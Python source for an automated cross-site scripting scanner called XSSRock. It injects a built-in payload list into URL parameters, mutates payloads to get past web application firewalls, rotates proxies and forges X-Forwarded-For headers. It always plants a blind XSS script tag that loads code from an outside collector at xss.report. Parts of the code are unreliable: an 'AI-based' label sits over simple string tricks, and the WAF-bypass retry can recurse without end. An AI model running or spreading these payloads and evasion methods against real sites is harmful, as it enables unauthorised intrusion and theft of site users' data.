import argparse
import requests
import threading
import queue
import random
import time
import json
import base64
import os
import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from urllib.parse import urlparse, parse_qs, urlencode

# Banner
def print_banner():
    banner = """
==================================================
üî• XSSRock - Automated XSS Scanner üî•
Created by RockSec | Advanced XSS Detection Suite
==================================================
    """
    print(banner)

# XSS Payloads & Bypass Techniques
bypass_techniques = [
    lambda p: base64.b64encode(p.encode()).decode(),  # Base64 Encoding
    lambda p: ''.join(f'&#{ord(c)};' for c in p),  # HTML Entity Encoding
    lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),  # Escaping
    lambda p: p.replace('alert', 'a\\lert'),  # JavaScript Obfuscation
    lambda p: f'<!--{p}-->',  # HTML Comment Injection
    lambda p: f'/**/{p}/**/',  # CSS/JavaScript Comment Obfuscation
    lambda p: f'";{p};"',  # String Injection
    lambda p: f'<scr<script>ipt>{p}</scr<script>ipt>',  # HTML Tag Break
    lambda p: f'<svg/onload="{p}">',  # SVG Injection
    lambda p: f'<img src=x onerror="{p}">',  # Attribute-Based XSS
    lambda p: f'`{p}`',  # Template Literals XSS
]

default_payloads = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "';alert(1)//",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    '"><img src=x onerror=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    "document.write('<script>alert(1)</script>');",
    "<body onload=alert(1)>",
]

# Load proxies from file
def load_proxies(proxy_file):
    proxies = []
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
    return proxies

# AI-based Payload Adaptation
def adapt_payload(payload):
    modified_payloads = [tech(payload) for tech in bypass_techniques]
    return modified_payloads

# Extract Parameters from URL
def extract_params(url):
    parsed_url = urlparse(url)
    return parse_qs(parsed_url.query)

# Save XSS Report
def save_report(url, param, payload):
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    report_file = f"xss_report_{timestamp}.json"

    report_data = {
        "timestamp": timestamp,
        "url": url,
        "parameter": param,
        "payload": payload
    }

    with open(report_file, "w") as f:
        json.dump(report_data, f, indent=4)

    print(f"üìÑ [SAVED] Report saved to {report_file}")

# Check for CSP & Bypass if possible
def check_csp(response):
    csp_header = response.headers.get("Content-Security-Policy")
    if not csp_header:
        return False  # No CSP, so it's exploitable
    bypass_patterns = [
        "unsafe-inline", "unsafe-eval", "data:", "blob:", "*"
    ]
    for pattern in bypass_patterns:
        if pattern in csp_header:
            return True  # CSP is weak and can be bypassed
    return False

# Selenium-based DOM XSS Detection
def detect_dom_xss(url, payload):
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Chrome(options=options)

    try:
        driver.get(url)
        if payload in driver.page_source:
            print(f"\033[92m[‚úÖ] DOM XSS Detected! {url} with {payload}\033[0m")
            return True
    except Exception as e:
        print(f"‚ö†Ô∏è [ERROR] Selenium failed - {e}")
    finally:
        driver.quit()
    return False

# Send Request and Check for XSS (Now Includes WAF 403 Bypass)
def send_request(url, param, payload, proxies, webhook):
    parsed_url = urlparse(url)
    params = extract_params(url)

    if param not in params:
        return False

    params[param] = payload
    new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(params, doseq=True)}"
    proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
    headers = {
        "User-Agent": "Mozilla/5.0 (XSS-Scanner)",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }

    print(f"üîç [TESTING] {new_url} with payload: {payload}")

    try:
        response = requests.get(new_url, headers=headers, proxies=proxy, timeout=5)

        if response.status_code == 403:
            print(f"‚ùå [WAF DETECTED] 403 Forbidden for payload: {payload}")
            return try_bypass_waf(url, param, payload, proxies, webhook)  # Try WAF bypass techniques

        if payload in response.text:
            print(f"\033[92m[‚úÖ] XSS Found! {new_url}\033[0m")
            if webhook:
                slack_notify(webhook, new_url, payload)
            return True
        elif check_csp(response):
            print(f"‚ö†Ô∏è [WARNING] CSP detected but can be bypassed.")

    except requests.exceptions.RequestException as e:
        print(f"‚ö†Ô∏è [ERROR] Failed to test {new_url} - {e}")

    return False

# Function to Bypass WAF (403)
def try_bypass_waf(url, param, original_payload, proxies, webhook):
    bypassed = False
    bypassed_payloads = adapt_payload(original_payload)  # Generate bypass variations

    for bypassed_payload in bypassed_payloads:
        print(f"üîÑ [WAF BYPASS] Retrying with payload: {bypassed_payload}")

        if send_request(url, param, bypassed_payload, proxies, webhook):
            print(f"\033[92m[üî•] WAF Bypassed! {url} with {bypassed_payload}\033[0m")
            bypassed = True
            break  # Stop if a bypassed payload succeeds

    if not bypassed:
        print(f"‚ùå [FAILED] Could not bypass WAF for {url} using known techniques.")

    return bypassed

# Slack Notification
def slack_notify(webhook, url, payload):
    slack_payload = {"text": f"üö® *XSS Confirmed!*\nüîó URL: {url}\nüí• Payload: `{payload}`"}
    try:
        response = requests.post(webhook, json=slack_payload)
        if response.status_code == 200:
            print(f"üì¢ [NOTIFIED] Slack notification sent successfully.")
        else:
            print(f"‚ö†Ô∏è [ERROR] Failed to send Slack notification - {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"‚ö†Ô∏è [ERROR] Failed to send Slack notification - {e}")

# Blind XSS Injection
def send_blind_xss(url, param):
    blind_xss_payload = f"<script src='https://xss.report/c/rocksec'></script>"
    send_request(url, param, blind_xss_payload, [], None)

# Scanner Function
def scan_xss(url, payloads, proxies, webhook):
    print(f"\nüöÄ [STARTING SCAN] {url}\n" + "-" * 50)

    params = extract_params(url)
    for param in params:
        print(f"\nüìå [PARAMETER] Testing parameter: {param}")

        for payload in payloads:
            if send_request(url, param, payload, proxies, webhook):
                print(f"\033[92m[‚úÖ] XSS Confirmed on {param} with payload: {payload}\033[0m")

        send_blind_xss(url, param)  # Always send blind XSS payload

# Multithreaded Worker
def worker(queue, payloads, proxies, webhook):
    while not queue.empty():
        url = queue.get()
        scan_xss(url, payloads, proxies, webhook)
        queue.task_done()

# Main Execution
def main():
    print_banner()  # Print the banner at the start

    parser = argparse.ArgumentParser(description="üî• Python XSS Scanner üî•")
    parser.add_argument("-u", "--url", help="Test a single URL")
    parser.add_argument("-f", "--file", help="File containing URLs")
    parser.add_argument("-p", "--payloads", help="File or directory containing payloads")
    parser.add_argument("-w", "--webhook", help="Slack Webhook URL for notifications")
    parser.add_argument("--proxy", help="File containing proxy list (optional)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")

    args = parser.parse_args()

    proxies = load_proxies(args.proxy)

    payloads = default_payloads
    if args.payloads:
        if os.path.isdir(args.payloads):
            payloads = []
            for file in os.listdir(args.payloads):
                with open(os.path.join(args.payloads, file), "r") as f:
                    payloads.extend([line.strip() for line in f if line.strip()])
        elif os.path.isfile(args.payloads):
            with open(args.payloads, "r") as f:
                payloads = [line.strip() for line in f if line.strip()]

    adapted_payloads = []
    for payload in payloads:
        adapted_payloads.extend(adapt_payload(payload))
    payloads.extend(adapted_payloads)

    url_queue = queue.Queue()

    if args.url:
        url_queue.put(args.url)
    elif args.file:
        with open(args.file, "r") as f:
            for line in f:
                url_queue.put(line.strip())

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(url_queue, payloads, proxies, args.webhook))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    # Save the report after the completion of the test
    if url_queue.empty():
        save_report(args.url if args.url else args.file, "All", "Completed")

if __name__ == "__main__":
    main()
